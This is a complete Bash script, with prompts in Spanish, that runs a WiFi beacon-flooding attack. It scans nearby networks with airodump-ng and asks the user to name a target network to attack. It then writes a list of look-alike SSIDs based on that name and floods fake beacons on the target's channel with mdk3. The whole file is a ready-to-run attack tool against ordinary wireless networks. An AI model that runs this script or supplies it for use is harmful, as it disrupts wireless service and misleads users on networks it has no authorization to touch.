#!/bin/bash

# Author @ju4ncaa (Juan Carlos Rodríguez)

# Paleta de colores ANSI
GREEN="\e[1;92m"
RED="\e[1;91m"
YELLOW="\e[1;93m"
CYAN="\e[1;96m"
RESET="\e[1;97m"


# Funcion salir
trap ctrl_c INT
stty -ctlecho
function ctrl_c(){
    echo -e "\n\n${RED}[!]${RESET} Saliendo..."
    if [[ -n "$xterm_pid" && -d "/proc/$xterm_pid" ]]; then
        kill "$xterm_pid"
    fi
    rm -f output-*.csv ssid_dict.txt &> /dev/null
    service wpa_supplicant start &> /dev/null
    exit 0; tput cnorm
}

# Banner
banner(){
    clear
    echo -e "${GREEN}┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋┏┓"
    echo -e "┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┓┃╋╋╋╋╋╋╋┏┛┗┓"
    echo -e "┃┗┛┗┳━━┳━━┳━━┳━━┳━┓┃┗┛┗┳┓┏┳━┳━┻┓┏┛"
    echo -e "┃┏━┓┃┃━┫┏┓┃┏━┫┏┓┃┏┓┫┏━┓┃┃┃┃┏┫━━┫┃${RESET}    (Hecho por ${YELLOW}0xju4ncaa${RESET})"
    echo -e "${GREEN}┃┗━┛┃┃━┫┏┓┃┗━┫┗┛┃┃┃┃┗━┛┃┗┛┃┃┣━━┃┗┓"
    echo -e "┗━━━┻━━┻┛┗┻━━┻━━┻┛┗┻━━━┻━━┻┛┗━━┻━┛${RESET}"
    sleep 1
}

# Comprueba si las herramientas necesarias están instaladas
check_tools(){
    tput civis; stty -echo
    tools=("iw" "airmon-ng" "airodump-ng" "mdk3" "xterm")
    echo -e "\n${CYAN}[*]${RESET} Comprobando herramientas necesarias...\n"
    for tool in "${tools[@]}"; do
        if command -v $tool &> /dev/null; then
            echo -e "$tool....${GREEN}ok${RESET}"
        else
            echo -e "$tool....${RED}no${RESET}"
            echo -e "\n${RED}[!]${RESET} La herramienta ${YELLOW}$tool${RESET} no está instalada en el sistema, debes instalarla para continuar."
	    exit 1
        fi
        sleep 0.5
    done; tput cnorm; stty echo
}

# Listar interfaces de red disponibles
select_interface(){
    tput civis; stty -echo
    echo -e "\n${CYAN}[*]${RESET} Empezando...\n"
    sleep 1
    echo -e "\n${CYAN}[*]${RESET} Interfaces de red inalámbrica disponibles:\n"
    interfaces=$(iw dev | grep Interface | awk '{print $2}')
    counter=1
    for interface in $interfaces; do
        echo -e "${YELLOW}${counter}.${RESET} ${interface}"
        ((counter++))
    done
    tput cnorm; stty echo
    echo -n -e "\n${CYAN}Seleccione la interfaz con la que desea trabajar >${RESET} "
    read interface
    tput civis; stty -echo
    if ! ifconfig "${interface}" &> /dev/null; then
        echo -e "\n\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no es válida.\n"
        exit 1
    else
        echo -e "\n\n${CYAN}[*]${RESET} Comprobación del modo monitor en ${YELLOW}$interface${RESET}\n"
        sleep 1
        if ! iwconfig $interface | grep "Mode:Monitor" &> /dev/null; then
            echo -e "\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no está en modo monitor, actívala para continuar...\n"
            exit 1
        else
            echo -e "\n${GREEN}[*]${RESET} Modo monitor activado en ${YELLOW}$interface${RESET}, continuando...\n"
        fi
    fi
}

# Mostrar la tabla del escaneo de la red
show_table(){
    clear
    banner
    echo -e "\n${CYAN}Available networks:${RESET}\n"
    echo -e "--------------------------------------------------------------"
    echo -e "| BSSID              | ESSID               | Canal | Potencia |"
    echo -e "--------------------------------------------------------------"
    grep -E -o "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" output-01.csv | sort -u | while read -r bssid; do
        essid=$(grep "$bssid" output-01.csv | awk -F "," '{print $14}')
        channel=$(grep "$bssid" output-01.csv | awk -F "," '{print $4}')
        power=$(grep "$bssid" output-01.csv | awk -F "," '{print $8}')
        printf "| %-17s | %-20s | %-5s | %-8s |\n" "$bssid" "$essid" "$channel" "$power"
    done
    echo -e "--------------------------------------------------------------"
}

# Escaneo de redes WIFI
net_scan(){
    stty echo; tput cnorm
    echo -n -e "\n${CYAN}¿Desea continuar con el escaneo de la red? ${YELLOW}(y/n)${RESET} >${RESET} "
    read option_choose
    tput civis; stty -echo
    if [[ "${option_choose,,}" == "y" ]]; then
        echo -e "\n\n${GREEN}[*]${RESET} Iniciando el escaneo de red...\n"
        sleep 1
        clear
        banner
        echo -e "\n${YELLOW}[*]${RESET} Escaneado de red en curso...\n"
        xterm -geometry 120x40 -e "airodump-ng ${interface} --output-format csv -w output"
        xterm_pid=$!
        wait "$xterm_pid"
        show_table
        tput cnorm; stty echo
        echo -n -e "\n${CYAN}Escribe el nombre de la red WiFi que deseas atacar >${RESET} "
        read selected_essid
        tput civis; stty -echo
        if grep -q "$selected_essid" output-01.csv; then
            echo -e "\n${GREEN}[*]${RESET} Se ha seleccionado la red ${YELLOW}$selected_essid${RESET}.${RESET}\n"
            sleep 0.5
        else
            echo -e "\n${RED}[!]${RESET} La red ${YELLOW}$selected_essid${RESET} no está en la lista.${RESET}\n"
            echo -e "\n${RED}[!] Saliendo...${RESET}"
            exit 1 
        fi
    else
        echo -e "\n\n${RED}[!] Saliendo...${RESET}"
        exit 0
    fi
}

# Realizar ataque Beacon Flooding
beacon_attack(){
    selected_channel=$(grep "$selected_essid" output-01.csv | awk -F "," '{print $4}')
    echo -e "\n${CYAN}[*]${RESET} Creando diccionario de ataque para la red ${YELLOW}$selected_essid${RESET}\n"
    for i in $(seq 1 10); do
        echo "${selected_essid}${i}" >> ssid_dict.txt
    done
    sleep 1
    echo -e "\n${GREEN}[*]${RESET} Diccionario creado con éxito!\n"
    clear
    banner
    echo -e "\n${CYAN}[*]${RESET} Ataque en curso a la red ${YELLOW}${selected_essid}${RESET} ${NETWORK}(Ctrl + C para finalizar)...${RESET}\n"
    mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
}

# Programa principal
if [ "$(id -u)" == "0" ]; then
    banner
    check_tools
    select_interface
    net_scan
    beacon_attack
else
    echo -e "\n${RED}[!]${RESET} Se requieren permisos de superusuario ${RED}(root)${RESET} para ejecutar el script\n"
    exit 1
fi
